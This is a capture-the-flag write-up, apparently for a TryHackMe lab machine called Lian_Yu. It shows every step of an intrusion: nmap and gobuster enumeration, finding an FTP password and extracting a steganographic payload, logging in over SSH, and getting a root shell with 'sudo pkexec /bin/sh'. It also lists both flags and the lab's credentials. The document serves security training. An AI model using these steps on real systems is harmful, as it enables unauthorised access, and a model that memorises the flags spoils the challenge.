---
custom_edit_url: null
---

## Task 1: Find the Flags
### What is the Web Directory you found?
We can scan the target machine using `nmap`.
```
$ nmap -sC -sV 10.10.167.102
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 12:35 IST
Nmap scan report for 10.10.167.102
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33771/tcp6  status
|   100024  1          35966/udp6  status
|   100024  1          52027/udp   status
|_  100024  1          55640/tcp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
```
As we can see there are three open ports:

| Port | Service | 
| :-: | :-: |
| 21 | ftp |
| 22 | ssh |
| 80 | http | 
| 111 | rpcbind |

Let's use `gobuster` to brute force the web pages.
```
$ gobuster dir -u http://10.10.167.102 -w /usr/share/wordlists/dirb/big.txt  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.102
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/island               (Status: 301) [Size: 236] [--> http://10.10.167.102/island/]
/server-status        (Status: 403) [Size: 199]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
Let's go to the `/island` webpage.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/dc2b49a4-62f3-416c-a7c4-64e50a6f9429)
</figure>

We can view the page source using `CTRL+U`.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/3b5ef6dc-a9e6-4627-85b5-d07e87961c78)
</figure>

So the username is `vigilante`.

For now, let's conduct a `gobuster` scan on `/island/` using another list.
```
$ gobuster dir -u http://10.10.167.102/island -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.102/island
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 241] [--> http://10.10.167.102/island/2100/]
Progress: 10000 / 10001 (99.99%)
===============================================================
Finished
===============================================================
```
### Answer
```
2100
```

&nbsp;

### what is the file name you found?
Let's visit the `/island/2100` page and check it's source.

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/1dd3a4e5-6d5c-4d49-a83c-49b17b1816a1)
</figure>

Now that we know the file extension is `.ticket`, we can perform another `gobuster` scan.
```
$ gobuster dir -u http://10.10.167.102/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x ticket
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.102/island/2100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
-- snip --;
```
### Answer
```
green_arrow.ticket
```

&nbsp;

### what is the FTP password?
Let's visit the `/island/2100/green_arrow.ticket` page.

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/7584a57b-97d4-43a1-b865-bcb355a088f3)
</figure>

```
RTy8yhBQdscX
```
Let's decode the string using Cyberchef.

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/83b49e60-62c7-4e8c-bf2b-6471c2068bad)
</figure>

So the FTP password is `!#th3h00d`.
### Answer
```
!#th3h00d
```

&nbsp;

### what is the file name with SSH password?
We can now use `vigilante` as the username and `!#th3h00d` as the password to login through FTP.
```
$ ftp vigilante@10.10.167.102
Connected to 10.10.167.102.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Let's look around for important files.
```
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```
We can download these files to our machine using the `get` command.
```
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |***********************************************************************************************************************************************************************************************|   499 KiB  219.65 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:02 (207.51 KiB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |***********************************************************************************************************************************************************************************************|   537 KiB  225.86 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:02 (213.64 KiB/s)
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |***********************************************************************************************************************************************************************************************|   186 KiB  156.63 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:01 (141.06 KiB/s)
ftp> get .other_user
local: .other_user remote: .other_user
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |***********************************************************************************************************************************************************************************************|  2483        2.42 KiB/s    --:-- ETA
226 Transfer complete.
2483 bytes received in 00:00 (18.13 KiB/s)
```
Let's check out the images.

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Knign/Write-ups/assets/110326359/3cd49a83-77f1-456d-90c5-dc104276b395)
</figure>

We can see that the `Leave_me_alone.png` file is not working properly.

Let's check its has dump.
```
$ xxd Leave_me_alone.png | head
00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
00000010: 0000 034d 0000 01db 0806 0000 0017 a371  ...M...........q
00000020: 5b00 0020 0049 4441 5478 9cac bde9 7a24  [.. .IDATx....z$
00000030: 4b6e 2508 33f7 e092 6466 dea5 557b 6934  Kn%.3...df..U{i4
00000040: 6a69 54fd f573 cebc c03c 9c7e b4d4 a556  jiT..s...<.~...V
00000050: 4955 75d7 5c98 5c22 c2dd 6c3e 00e7 c0e0  IUu.\.\"..l>....
00000060: 4e66 a94a 3d71 3f5e 32c9 085f cccd 60c0  Nf.J=q?^2.._..`.
00000070: c1c1 41f9 7ffe dfff bb2f eb22 fab5 aeab  ..A....../."....
00000080: 7d9d cfe7 f81e 5fcb 49ce ed94 7eb7 d8d7  }....._.I...~...
00000090: 723c c9e9 7492 d3d3 494e c793 9c8f 8b2c  r<..t...IN.....,
```
So the first  8 characters are wrong. In a PNG file the first 8 characters should be `89 50 4E 47 0D 0A 1A 0A` as shown in this image:

<figure style={{ textAlign: 'center' }}>
![8](https://github.com/Knign/Write-ups/assets/110326359/ba5b98c1-04ee-45b0-af5f-47823fc5377a)
</figure>

Let's use `hexedit` to fix the bytes.
```
$ hexedit Leave_me_alone.png
```

<figure style={{ textAlign: 'center' }}>
![9](https://github.com/Knign/Write-ups/assets/110326359/e84cd651-d29b-4ff1-9c11-595357e6babe)
</figure>

<figure style={{ textAlign: 'center' }}>
![10](https://github.com/Knign/Write-ups/assets/110326359/48fe1a15-68ad-427a-a688-291faa1f4486)
</figure>

The password for something is `password`.

Let's now extract the file in `aa.jpg` using this password.
```
$ steghide extract -sf aa.jpg        
Enter passphrase: 
wrote extracted data to "ss.zip".
```
We can now `unzip` the ZIP file.
```
$ unzip ss.zip                        
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado  
```
Let's read the `shado` file.
```
$ cat shado      
M3tahuman
```
Another password.
### Answer
```
shado
```

&nbsp;

### user.txt
We also downloaded the `.other_user` file from the FTP server. Let's read that.
```
$ cat .other_user
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```
So it seems like `M3tahuman` is the password for the user `slade`.

Let's try it out.
```
$ ssh slade@10.10.167.102    
The authenticity of host '10.10.167.102 (10.10.167.102)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.167.102' (ED25519) to the list of known hosts.
slade@10.10.167.102's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ 
```
Let's get the flag inside `user.txt`.
```
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
```
### Answer
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

&nbsp;

### root.txt
Let's check what files `slade` can execute without the password.
```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
We can go to GTFOBins to find an exploit.

<figure style={{ textAlign: 'center' }}>
![11](https://github.com/Knign/Write-ups/assets/110326359/fe4c1949-886e-4e6e-9601-9f8702dc9f97)
</figure>

```
slade@LianYu:~$ sudo pkexec /bin/sh
# 
```
We can now get the root flag.
```
# ls
root.txt
# cat root.txt  
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```
### Answer
```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
